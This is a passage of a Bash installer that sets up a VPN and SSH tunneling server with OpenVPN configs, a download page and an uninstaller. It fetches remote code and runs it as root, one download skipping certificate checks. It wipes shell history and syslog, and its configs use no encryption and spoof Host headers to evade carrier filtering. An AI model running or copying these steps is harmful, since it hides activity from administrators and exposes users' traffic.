systemctl start openvpn-server@server_udp &>/dev/null
systemctl enable openvpn-server@server_tcp &> /dev/null
systemctl enable openvpn-server@server_udp &> /dev/null

systemctl start openvpn-server@ec_server_tcp &> /dev/null
systemctl start openvpn-server@ec_server_udp &> /dev/null
systemctl enable openvpn-server@ec_server_tcp &> /dev/null
systemctl enable openvpn-server@ec_server_udp &> /dev/null
}

function ConfigMenu(){
echo -e "[\e[32mInfo\e[0m] Creating Menu scripts.."

cd /usr/local/sbin/
rm -rf {accounts,base-ports,base-ports-wc,base-script,bench-network,clearcache,connections,create,create_random,create_trial,delete_expired,diagnose,edit_dropbear,edit_openssh,edit_openvpn,edit_ports,edit_squi*,edit_stunne*,locked_list,menu,options,ram,reboot_sys,reboot_sys_auto,restart_services,screenfetch,server,set_multilogin_autokill,set_multilogin_autokill_lib,show_ports,speedtest,user_delete,user_details,user_details_lib,user_extend,user_list,user_lock,user_unlock,*_gtm_noload}
wget -q 'https://raw.githubusercontent.com/Bonveio/BonvScripts/master/menuV1.zip'
unzip -qq -o menuV1.zip
rm -f menuV1.zip
chmod +x ./*
dos2unix -q ./*
cd ~
}

function ConfigSyscript(){
echo -e "[\e[32mInfo\e[0m] Creating Startup scripts.."
if [[ ! -e /etc/bonveio ]]; then
 mkdir -p /etc/bonveio
fi
cat <<'EOFSH' > /etc/bonveio/startup.sh
#!/bin/bash
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
#
export DEBIAN_FRONTEND=noninteractive
#apt clean
screen -dmS delexpuser bash /usr/local/sbin/delete_expired &>/dev/null
screen -dmS socks python ~/.ws-socks.py &>/dev/null
screen -dmS socks2 python ~/.ws-ssl-socks.py &>/dev/null
EOFSH
chmod +x /etc/bonveio/startup.sh

echo 'clear' > /etc/profile.d/bonv.sh
echo 'screenfetch -p -A Debian | sed -r "/^\s*$/d" ' >> /etc/profile.d/bonv.sh
chmod +x /etc/profile.d/bonv.sh

echo "[Unit]
Description=Bonveio Startup Script
Before=network-online.target
Wants=network-online.target
[Service]
Type=oneshot
ExecStart=/bin/bash /etc/bonveio/startup.sh
RemainAfterExit=yes
[Install]
WantedBy=multi-user.target" > /etc/systemd/system/bonveio.service
chmod +x /etc/systemd/system/bonveio.service
systemctl daemon-reload
systemctl start bonveio
systemctl enable bonveio &> /dev/null

#sed -i '/0\s*4\s*.*/d' /etc/cron.d/*
#sed -i '/0\s*4\s*.*/d' /etc/crontab
sed -i '/*.root\sreboot$/d' /etc/cron.d/*
sed -i '/*.root\sreboot$/d' /etc/crontab
echo -e "\r\n" >> /etc/crontab
echo -e "0 4\t* * *\troot\treboot" >> /etc/cron.d/reboot_sys
printf "%s" "0 */4  * * *  root  /usr/bin/screen -S delexpuser -dm bash -c '/usr/local/sbin/delete_expired'" > /etc/cron.d/autodelete_expireduser
systemctl restart cron
}

function ConfigNginxOvpn(){
echo -e "[\e[32mInfo\e[0m] Configuring Nginx configs.."

cat <<'EOFnginx' > /etc/nginx/conf.d/bonveio-ovpn-config.conf
# BonvScripts
# https://t.me/BonvScripts
# Please star my Repository: https://github.com/Bonveio/BonvScripts
# https://phcorner.net/threads/739298
#
server {
 listen 0.0.0.0:86;
 server_name localhost;
 root /var/www/openvpn;
 index index.html;
}
EOFnginx

rm -rf /etc/nginx/sites-*
rm -rf /usr/share/nginx/html
rm -rf /var/www/openvpn
mkdir -p /var/www/openvpn

echo -e "[\e[32mInfo\e[0m] Creating OpenVPN client configs.."

cat <<'mySiteOvpn' > /var/www/openvpn/index.html
<!DOCTYPE html>
<html lang="en">
<!-- Simple OVPN Download site by FirenetDev -->
<head><meta charset="utf-8" /><title>MyScriptName OVPN Config Download</title><meta name="description" content="MyScriptName Server" /><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport" /><meta name="theme-color" content="#000000" /><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css"><link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet"><link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.8.3/css/mdb.min.css" rel="stylesheet"></head><body><div class="container justify-content-center" style="margin-top:9em;margin-bottom:5em;"><div class="col-md"><div class="view"><img src="https://openvpn.net/wp-content/uploads/openvpn.jpg" class="card-img-top mb-5" height="150"><div class="mask rgba-white-slight"></div></div><div class="card"><div class="card-body"><h5 class="card-title">Config List</h5><br /><ul class="list-group">
<li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>TCP <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> TCP Protocol</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/tcp.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li>
<li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>TCP OHP <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> TCP Protocol via OHP</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/tcp_ohp.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li>
<li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>TCP EC <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> TCP Protocol Elliptic Curve</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/tcp_ec.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li>
<li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>TCP OHP EC <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> TCP Protocol Elliptic Curve via OHP</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/tcp_ohp_ec.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li>
<li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>UDP <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> UDP Protocol</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/udp.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li>
<li class="list-group-item justify-content-between align-items-center" style="margin-bottom:1em;"><p>UDP EC <span class="badge light-blue darken-4">Android/iOS/PC/Modem</span><br /><small> UDP Protocol Elliptic Curve</small></p><a class="btn btn-outline-success waves-effect btn-sm" href="http://IP-ADDRESS:NGINXPORT/udp_ec.ovpn" style="float:right;"><i class="fa fa-download"></i> Download</a></li>
</ul></div></div></div></div></body></html>
mySiteOvpn

sed -i "s|MyScriptName|BonvScripts|g" /var/www/openvpn/index.html
sed -i "s|NGINXPORT|86|g" /var/www/openvpn/index.html
sed -i "s|IP-ADDRESS|$(ip_address)|g" /var/www/openvpn/index.html

######
cat <<"EOFtcp" > /var/www/openvpn/tcp.ovpn
# OpenVPN Server build vOPENVPN_SERVER_VERSION
# Server Location: OPENVPN_SERVER_LOCATION
# Server ISP: OPENVPN_SERVER_ISP
# 
client
dev tun
persist-tun
proto tcp
remote IP-ADDRESS 179
http-proxy IP-ADDRESS 8000
persist-remote-ip
resolv-retry infinite
connect-retry 0 1
remote-cert-tls server
nobind
reneg-sec 0
keysize 0
rcvbuf 0
sndbuf 0
verb 2
comp-lzo
auth none
auth-nocache
cipher none
setenv CLIENT_CERT 0
http-proxy-option VERSION 1.1
http-proxy-option AGENT Chrome/80.0.3987.87
http-proxy-option CUSTOM-HEADER Host redirect.googlevideo.com
http-proxy-option CUSTOM-HEADER X-Forward-Host redirect.googlevideo.com
http-proxy-option CUSTOM-HEADER X-Forwarded-For redirect.googlevideo.com
http-proxy-option CUSTOM-HEADER Referrer redirect.googlevideo.com
auth-user-pass
EOFtcp

cat <<"EOFohp1" > /var/www/openvpn/tcp_ohp.ovpn
# OpenVPN Server build vOPENVPN_SERVER_VERSION
# Server Location: OPENVPN_SERVER_LOCATION
# Server ISP: OPENVPN_SERVER_ISP
#
# Experimental Config only
# Examples demonstrated below on how to Play with OHPServer
#
client
dev tun
persist-tun
proto tcp
# We can play this one, put any host on the line
# remote anyhost.com anyport
# remote www.google.com.ph 443
#
# We can also play with CRLFs
#remote "HEAD https://ajax.googleapis.com HTTP/1.1/r/n/r/n"
# Every types of Broken remote line setups/crlfs/payload are accepted, just put them inside of double-quotes
remote "https://www.phcorner.net"
## use this line to modify OpenVPN remote port (this will serve as our fake ovpn port)
port 443
# This proxy uses as our main forwarder for OpenVPN tunnel.
http-proxy IP-ADDRESS 8087
# We can also play our request headers here, everything are accepted, put them inside of a double-quotes.
http-proxy-option VERSION 1.1
http-proxy-option CUSTOM-HEADER ""
http-proxy-option CUSTOM-HEADER "Host: www.firenetvpn.com%2F"
http-proxy-option CUSTOM-HEADER "X-Forwarded-Host: www.digicert.net%2F"
http-proxy-option CUSTOM-HEADER ""
persist-remote-ip
resolv-retry infinite
connect-retry 0 1
remote-cert-tls server
nobind
reneg-sec 0
keysize 0
rcvbuf 0
sndbuf 0
verb 2
comp-lzo
auth none
auth-nocache
cipher none
setenv CLIENT_CERT 0
auth-user-pass
EOFohp1

cat <<"EOFudp" > /var/www/openvpn/udp.ovpn
# OpenVPN Server build vOPENVPN_SERVER_VERSION
# Server Location: OPENVPN_SERVER_LOCATION
# Server ISP: OPENVPN_SERVER_ISP
#
# Example UDP Client. 
#
client
dev tun
persist-tun
proto udp
remote IP-ADDRESS 25222
persist-remote-ip
resolv-retry infinite
connect-retry 0 1
remote-cert-tls server
nobind
float
fast-io
reneg-sec 0
keysize 0
rcvbuf 0
sndbuf 0
verb 2
comp-lzo
auth none
auth-nocache
cipher none
setenv CLIENT_CERT 0
auth-user-pass
EOFudp

cat <<"EOFec" > /var/www/openvpn/tcp_ec.ovpn
# OpenVPN Server build vOPENVPN_SERVER_VERSION
# Server Location: OPENVPN_SERVER_LOCATION
# Server ISP: OPENVPN_SERVER_ISP
# 
client
dev tun
persist-tun
proto tcp
remote IP-ADDRESS 25980
http-proxy IP-ADDRESS 8000
persist-remote-ip
resolv-retry infinite
connect-retry 0 1
remote-cert-tls server
nobind
reneg-sec 0
keysize 0
rcvbuf 0
sndbuf 0
verb 2
comp-lzo
auth none
auth-nocache
cipher none
setenv CLIENT_CERT 0
tls-client
tls-version-min 1.2
tls-cipher TLS-ECDHE-ECDSA-WITH-AES-128-GCM-SHA256
http-proxy-option VERSION 1.1
http-proxy-option AGENT Chrome/80.0.3987.87
http-proxy-option CUSTOM-HEADER Host redirect.googlevideo.com
http-proxy-option CUSTOM-HEADER X-Forward-Host redirect.googlevideo.com
http-proxy-option CUSTOM-HEADER X-Forwarded-For redirect.googlevideo.com
http-proxy-option CUSTOM-HEADER Referrer redirect.googlevideo.com
auth-user-pass
EOFec

cat <<"EOFohpec" > /var/www/openvpn/tcp_ohp_ec.ovpn
# OpenVPN Server build vOPENVPN_SERVER_VERSION
# Server Location: OPENVPN_SERVER_LOCATION
# Server ISP: OPENVPN_SERVER_ISP
#
# Experimental Config only
# Examples demonstrated below on how to Play with OHPServer
#
client
dev tun
persist-tun
proto tcp
# We can play this one, put any host on the line
# remote anyhost.com anyport
# remote www.google.com.ph 443
#
# We can also play with CRLFs
#remote "HEAD https://ajax.googleapis.com HTTP/1.1/r/n/r/n"
# Every types of Broken remote line setups/crlfs/payload are accepted, just put them inside of double-quotes
remote "https://www.phcorner.net"
## use this line to modify OpenVPN remote port (this will serve as our fake ovpn port)
port 443
# This proxy uses as our main forwarder for OpenVPN tunnel.
http-proxy IP-ADDRESS 8088
# We can also play our request headers here, everything are accepted, put them inside of a double-quotes.
http-proxy-option VERSION 1.1
http-proxy-option CUSTOM-HEADER ""
http-proxy-option CUSTOM-HEADER "Host: www.firenetvpn.com%2F"
http-proxy-option CUSTOM-HEADER "X-Forwarded-Host: www.digicert.net%2F"
http-proxy-option CUSTOM-HEADER ""
persist-remote-ip
resolv-retry infinite
connect-retry 0 1
remote-cert-tls server
nobind
reneg-sec 0
keysize 0
rcvbuf 0
sndbuf 0
verb 2
comp-lzo
auth none
auth-nocache
cipher none
setenv CLIENT_CERT 0
tls-client
tls-version-min 1.2
tls-cipher TLS-ECDHE-ECDSA-WITH-AES-128-GCM-SHA256
auth-user-pass
EOFohpec

cat <<"EOFudpec" > /var/www/openvpn/udp_ec.ovpn
# OpenVPN Server build vOPENVPN_SERVER_VERSION
# Server Location: OPENVPN_SERVER_LOCATION
# Server ISP: OPENVPN_SERVER_ISP
#
# Example UDP Client. 
#
client
dev tun
persist-tun
proto udp
remote IP-ADDRESS 25985
persist-remote-ip
resolv-retry infinite
connect-retry 0 1
remote-cert-tls server
nobind
float
fast-io
reneg-sec 0
keysize 0
rcvbuf 0
sndbuf 0
verb 2
comp-lzo
auth none
auth-nocache
cipher none
setenv CLIENT_CERT 0
tls-client
tls-version-min 1.2
tls-cipher TLS-ECDHE-ECDSA-WITH-AES-128-GCM-SHA256
auth-user-pass
EOFudpec

sed -i "s|IP-ADDRESS|$(ip_address)|g" /var/www/openvpn/*.ovpn

echo -e "<ca>\n$(cat /etc/openvpn/ca.crt)\n</ca>" >> /var/www/openvpn/tcp.ovpn

echo -e "<ca>\n$(cat /etc/openvpn/ca.crt)\n</ca>" >> /var/www/openvpn/tcp_ohp.ovpn

echo -e "<ca>\n$(cat /etc/openvpn/ca.crt)\n</ca>" >> /var/www/openvpn/udp.ovpn

echo -e "<ca>\n$(cat /etc/openvpn/ec_ca.crt)\n</ca>" >> /var/www/openvpn/tcp_ec.ovpn

echo -e "<ca>\n$(cat /etc/openvpn/ec_ca.crt)\n</ca>" >> /var/www/openvpn/tcp_ohp_ec.ovpn

echo -e "<ca>\n$(cat /etc/openvpn/ec_ca.crt)\n</ca>" >> /var/www/openvpn/udp_ec.ovpn

sed -i "s|OPENVPN_SERVER_VERSION|$(openvpn --version | cut -d" " -f2 | head -n1)|g" /var/www/openvpn/*.ovpn
sed -i "s|OPENVPN_SERVER_LOCATION|$(curl -4s http://ipinfo.io/country), $(curl -4s http://ipinfo.io/region)|g" /var/www/openvpn/*.ovpn
sed -i "s|OPENVPN_SERVER_ISP|$(curl -4s http://ipinfo.io/org | sed -e 's/[^ ]* //')|g" /var/www/openvpn/*.ovpn

cd /var/www/openvpn
zip -r Configs.zip *.ovpn &> /dev/null
cd

echo -e "[\e[33mNotice\e[0m] Restarting Nginx Service.."
systemctl restart nginx
}

function UnistAll(){
 echo -e " Removing dropbear"
 sed -i '/Port 225/d' /etc/ssh/sshd_config
 sed -i '/Banner .*/d' /etc/ssh/sshd_config
 systemctl restart ssh
 systemctl stop dropbear
 apt remove --purge dropbear -y
 rm -f /etc/default/dropbear
 rm -rf /etc/dropbear/*
 echo -e " Removing stunnel"
 systemctl stop stunnel &> /dev/null
 systemctl stop stunnel4 &> /dev/null
 apt remove --purge stunnel -y
 rm -rf /etc/stunnel/*
 rm -rf /etc/default/stunnel*
 echo -e " Removing webmin"
 systemctl stop webmin
 apt remove --purge webmin -y
 rm -rf /etc/webmin/*;
 rm -f /etc/apt/sources.list.d/webmin*;
 echo -e " Removing OpenVPN server and client config download site"
 systemctl stop openvpn-server@server_tcp &>/dev/null
 systemctl stop openvpn-server@server_udp &>/dev/null
 systemctl stop openvpn-server@ec_server_tcp &>/dev/null
 systemctl stop openvpn-server@ec_server_udp &>/dev/null
 systemctl disable openvpn-server@server_tcp &>/dev/null
 systemctl disable openvpn-server@server_udp &>/dev/null
 systemctl disable openvpn-server@ec_server_tcp &>/dev/null
 systemctl disable openvpn-server@ec_server_udp &>/dev/null
 apt remove --purge openvpn -y -f
 rm -rf /etc/openvpn/*
 rm -rf /var/www/openvpn
 rm -f /etc/apt/sources.list.d/openvpn*
 rm -rf /etc/nginx/conf.d/bonveio-ovpn-config*
 systemctl restart nginx &> /dev/null
 echo -e "Removing squid"
 apt remove --purge squid -y
 rm -rf /etc/squid/*
 echo -e "Removing privoxy"
 apt remove --purge privoxy -y
 rm -rf /etc/privoxy/*
 systemctl stop badvpn-udpgw.service &>/dev/null
 systemctl disable badvpn-udpgw.service &>/dev/null
 rm -rf /usr/local/{share/man/man7/badvpn*,share/man/man8/badvpn*,bin/badvpn-*}
 echo -e " Finalizing.."
 rm -rf /etc/bonveio
 rm -rf /etc/banner
 systemctl disable bonveio &> /dev/null
 rm -rf /etc/systemd/system/bonveio.service
 rm -rf /etc/cron.d/b_reboot_job
 rm -rf /etc/cron.d/reboot_sys
 rm -rf /etc/cron.d/autodelete_expireduser
 systemctl restart cron &> /dev/null
 rm -rf /usr/local/sbin/{accounts,base-ports,base-ports-wc,base-script,bench-network,clearcache,connections,create,create_random,create_trial,delete_expired,diagnose,edit_dropbear,edit_openssh,edit_openvpn,edit_ports,edit_squi*,edit_stunne*,locked_list,menu,options,ram,reboot_sys,reboot_sys_auto,restart_services,server,set_multilogin_autokill,set_multilogin_autokill_lib,show_ports,speedtest,user_delete,user_details,user_details_lib,user_extend,user_list,user_lock,user_unlock,activate_gtm_noload,deactivate_gtm_noload}
 rm -rf /etc/profile.d/bonv.sh
 rm -rf /tmp/*
 apt autoremove -y -f
 rm -rf /etc/ohpserver
 systemctl stop ohpserver.service &> /dev/null
 systemctl disable ohpserver.service &> /dev/null
 systemctl stop ohpserver-autorecon.service &>/dev/null
 systemctl disable ohpserver-autorecon.service &>/dev/null
 rm -rf /etc/systemd/system/ohpserver-autorecon.service
 rm -rf /lib/systemd/system/ohpserver.service
 rm -rf /lib/systemd/system/badvpn-udpgw.service
 systemctl daemon-reload &>/dev/null
 echo 3 > /proc/sys/vm/drop_caches
}

function CondomSocks(){
#Adding condom
 wget --no-check-certificate http://firenetvpn.net/files/bonscript/ws-socks.py -O ~/.ws-socks.py
 wget --no-check-certificate http://firenetvpn.net/files/bonscript/ws-ssl-socks.py -O ~/.ws-ssl-socks.py
 dos2unix ~/.ws-socks.py
 dos2unix ~/.ws-ssl-socks.py
 chmod +x ~/.ws-socks.py
 chmod +x ~/.ws-ssl-socks.py
}

function InstallScript(){
if [[ ! -e /dev/net/tun ]]; then
 BONV-MSG
 echo -e "[\e[1;31m×\e[0m] You cant use this script without TUN Module installed/embedded in your machine, file a support ticket to your machine admin about this matter"
 echo -e "[\e[1;31m-\e[0m] Script is now exiting..."
 exit 1
fi

rm -rf /root/.bash_history && echo '' > /var/log/syslog && history -c

## Start Installation
clear
clear
BONV-MSG
echo -e ""
InsEssentials
ConfigOpenSSH
ConfigAuthentication
install_sudo
ConfigDropbear
ConfigStunnel
ConfigProxy
ConfigWebmin
ConfigOpenVPN
ConfigMenu
ConfigSyscript
ConfigNginxOvpn
CondomSocks

echo -e "[\e[32mInfo\e[0m] Finalizing installation process.."
ln -fs /usr/share/zoneinfo/Asia/Manila /etc/localtime
sed -i '/\/bin\/false/d' /etc/shells
sed -i '/\/usr\/sbin\/nologin/d' /etc/shells
echo '/bin/false' >> /etc/shells
echo '/usr/sbin/nologin' >> /etc/shells
sleep 1
######

clear
clear
clear
bash /etc/profile.d/bonv.sh
BONV-MSG
echo -e ""
echo -e "\e[38;5;46m=\e[0m\e[38;5;46m=\e[0m\e[38;5;47m S\e[0m\e[38;5;47mu\e[0m\e[38;5;48mc\e[0m\e[38;5;48m\e[0m\e[38;5;49mc\e[0m\e[38;5;49me\e[0m\e[38;5;50ms\e[0m\e[38;5;50ms\e[0m\e[38;5;51m I\e[0m\e[38;5;51mn\e[0m\e[38;5;50ms\e[0m\e[38;5;50mt\e[0m\e[38;5;49ma\e[0m\e[38;5;49ml\e[0m\e[38;5;48ml\e[0m\e[38;5;48ma\e[0m\e[38;5;47mt\e[0m\e[38;5;47mi\e[0m\e[38;5;46mo\e[0m\e[38;5;46mn \e[0m\e[38;5;47m=\e[0m\e[38;5;47m=\e[0m"
echo -e ""
echo -e "\e[92m Service Ports\e[0m\e[97m:\e[0m"
echo -e "\e[92m OpenSSH\e[0m\e[97m: 22, 225\e[0m"
echo -e "\e[92m Stunnel\e[0m\e[97m: 442, 444\e[0m"
echo -e "\e[92m Dropbear\e[0m\e[97m: 701, 555\e[0m"
echo -e "\e[92m Squid\e[0m\e[97m: 8000, 8080\e[0m"
echo -e "\e[92m OpenVPN\e[0m\e[97m: 179(TCP), 25222(UDP)\e[0m"
echo -e "\e[92m OpenVPN EC\e[0m\e[97m: 25980(TCP), 25985(UDP)\e[0m"
echo -e "\e[92m NGiNX\e[0m\e[97m: 86\e[0m"
echo -e "\e[92m Webmin\e[0m\e[97m: 10000\e[0m"
echo -e "\e[92m BadVPN-udpgw\e[0m\e[97m: 7300\e[0m"
echo -e ""
echo -e "\e[97m NEW! OHPServer builds\e[0m"
echo -e "\e[97m (Good for Payload bugging and any related HTTP Experiments)\e[0m"
echo -e "\e[92m OHP+Dropbear\e[0m\e[97m: 8085\e[0m"
echo -e "\e[92m OHP+OpenSSH\e[0m\e[97m: 8086\e[0m"
echo -e "\e[92m OHP+OpenVPN\e[0m\e[97m: 8087\e[0m"
echo -e "\e[92m OHP+OpenVPN Elliptic Curve\e[0m\e[97m: 8088\e[0m"
echo -e ""
echo -e ""
echo -e "\e[92m OpenVPN Configs Download Site\e[0m\e[97m:\e[0m"
echo -e "\e[97m http://$(ip_address):86\e[0m"
echo -e ""
echo -e "\e[92m All OpenVPN Configs Archive\e[0m\e[97m:\e[0m"
echo -e "\e[97m http://$(ip_address)/Configs.zip\e[0m"
echo -e ""
echo -e ""
echo -e " * Script by Bonveio"
echo -e " * OHPServer by lfasmpao"
echo -e " ©BonvScripts"
echo -e ""
echo -e " [Note] DO NOT RESELL THIS SCRIPT"
echo -e " This script is under project of\n https://github.com/Bonveio/BonvScripts"
echo -e ""
rm -f DebianVPS-Installe*
rm -rf /root/.bash_history && history -c && echo '' > /var/log/syslog
}

BONV-MSG
echo -e " Starting Installation"
echo -e " CRTL + C if you wish to cancel it"
sleep 5
InstallScript
